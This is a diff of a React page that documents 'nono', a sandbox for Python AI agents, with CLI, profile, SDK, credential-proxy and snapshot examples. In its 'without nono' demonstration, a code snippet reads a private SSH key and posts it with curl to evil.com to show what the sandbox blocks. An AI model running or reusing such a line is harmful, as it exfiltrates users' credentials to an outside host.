@@ -49,19 +49,19 @@ const relatedPages = [
 ];
 
 const cliCode = `# Sandbox a Python AI agent with read-write to the project
-nono run --allow . -- python agent.py
+nono run --allow-cwd -- python agent.py
 
-# Read-only access to source, write to output only
-nono run --read ./src --write ./output -- python transform.py
+# Restrict network to LLM API endpoints only
+nono run --allow-cwd --network-profile minimal -- python agent.py
 
-# Block all network access
-nono run --allow . --net-block -- python train.py
+# Inject credentials from keychain (real keys never enter the sandbox)
+nono run --allow-cwd --proxy-credential openai -- python agent.py
 
-# Use the built-in python_runtime security group
-nono run --allow . --group python_runtime -- python agent.py
+# Use a profile with the python_runtime security group
+nono run --profile python-agent.json --allow-cwd -- python agent.py
 
 # Sandbox a pip install to the project venv only
-nono run --allow . --group python_runtime -- pip install -r requirements.txt`;
+nono run --profile python-agent.json --allow-cwd -- pip install -r requirements.txt`;
 
 const profileCode = `{
   "meta": {
@@ -76,40 +76,89 @@ const profileCode = `{
     "allow": ["$HOME/.cache/pip"],
     "read_file": ["$HOME/.gitconfig"]
   },
-  "network": { "block": false },
+  "network": {
+    "allow_hosts": ["api.openai.com", "api.anthropic.com"]
+  },
   "workdir": { "access": "readwrite" },
   "interactive": false
 }`;
 
-const sdkCode = `from nono_py import CapabilitySet, SandboxState
+const sdkCode = `import nono_py as nono
 
-# Build a capability set programmatically
-caps = CapabilitySet()
-caps.allow_read_write("./workspace")
-caps.allow_read("./config")
+# Self-sandbox: restrict the current process (irrevocable)
+caps = nono.CapabilitySet()
+caps.allow_path("./workspace", nono.AccessMode.READ_WRITE)
+caps.allow_file("./config.json", nono.AccessMode.READ)
 caps.block_network()
+nono.apply(caps)
+# Everything after this is sandboxed — subprocess, ctypes, all of it
 
-# Apply — irrevocable after this call
-caps.apply()
+# Or sandbox a child process (parent stays unsandboxed)
+result = nono.sandboxed_exec(
+    caps,
+    ["python", "untrusted_agent.py"],
+    cwd="./workspace",
+    timeout_secs=30
+)
+print(result.exit_code, result.stdout.decode())`;
 
-# Everything after this runs inside the sandbox
-# subprocess.call, os.system, open() — all restricted
-import subprocess
-result = subprocess.run(["python", "agent.py"])
-# agent.py inherits the same restrictions`;
+const proxyCode = `import nono_py as nono
+
+# Network proxy with credential injection
+route = nono.RouteConfig(
+    prefix="/v1",
+    upstream="https://api.openai.com",
+    credential_key="openai_api_key",
+    inject_mode=nono.InjectMode.HEADER,
+    inject_header="Authorization",
+    credential_format="Bearer {credential}"
+)
+
+handle = nono.start_proxy(
+    nono.ProxyConfig(allowed_hosts=["api.openai.com"], routes=[route])
+)
+
+# Phantom tokens for the sandboxed process
+print(handle.env_vars())            # {"HTTP_PROXY": "..."}
+print(handle.credential_env_vars()) # {"OPENAI_API_KEY": "phantom-..."}
+
+# Audit trail after the session
+events = handle.drain_audit_events()
+handle.shutdown()`;
+
+const snapshotCode = `import nono_py as nono
+
+# Snapshot before agent execution
+exclusions = nono.ExclusionConfig(
+    use_gitignore=True,
+    exclude_patterns=["__pycache__", ".venv"]
+)
+mgr = nono.SnapshotManager("./workspace", exclusions)
+mgr.create_baseline()
+
+# ... agent modifies files ...
+
+mgr.create_incremental()
+for change in mgr.compute_restore_diff():
+    print(f"{change.change_type}: {change.path}")
+
+# Roll back everything
+mgr.restore_to(snapshot_number=0)`;
 
 const subprocessCode = `# Without nono: subprocess inherits full user permissions
 import subprocess
-subprocess.run(["curl", "https://evil.com/exfil",
-                "--data", open("/home/user/.ssh/id_rsa").read()])
+
+key = open("/home/user/.ssh/id_rsa").read()
+subprocess.run(["curl", "https://evil.com/exfil", "--data", key])
 # This works. Nothing stops it.
 
 # With nono: kernel denies access at the syscall level
-# $ nono run --allow ./project -- python agent.py
-subprocess.run(["curl", "https://evil.com/exfil",
-                "--data", open("/home/user/.ssh/id_rsa").read()])
-# Permission denied: /home/user/.ssh/id_rsa
-# The file is invisible to the sandboxed process.`;
+# $ nono run --allow-cwd -- python agent.py
+try:
+    key = open("/home/user/.ssh/id_rsa").read()
+except PermissionError:
+    pass  # EPERM — kernel blocked the open() syscall
+# The file is inaccessible to the sandboxed process.`;
 
 export default function PythonSandboxPage() {
   return (
@@ -311,18 +360,25 @@ export default function PythonSandboxPage() {
                 nono Python SDK
               </Link>{" "}
               (<code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
-                nono-py
+                pip install nono-py
               </code>
-              ) provides PyO3 bindings to the same Rust core. Build a{" "}
+              ) provides PyO3 bindings to the same Rust core with two
+              sandboxing modes:{" "}
               <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
-                CapabilitySet
-              </code>
-              , call{" "}
+                apply()
+              </code>{" "}
+              to sandbox the current process (irrevocable), or{" "}
               <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
-                .apply()
-              </code>
-              , and the kernel sandbox is active &mdash; irrevocable from that
-              point forward.
+                sandboxed_exec()
+              </code>{" "}
+              to run a command in a sandboxed child while the parent stays free.
+            </p>
+            <p>
+              The SDK also includes a network proxy with credential injection
+              (real API keys stay outside the sandbox), filesystem snapshots
+              with Merkle-verified rollback, and a policy engine for composable
+              security profiles. Full type stubs are included for mypy and IDE
+              autocompletion.
             </p>
           </div>
         </GlassCard>
@@ -331,6 +387,16 @@ export default function PythonSandboxPage() {
           code={sdkCode}
           language="python"
           filename="sandbox_agent.py"
+        />
+        <InfraCodeBlock
+          code={proxyCode}
+          language="python"
+          filename="proxy.py"
+        />
+        <InfraCodeBlock
+          code={snapshotCode}
+          language="python"
+          filename="snapshots.py"
           className="md:col-span-2"
         />
 
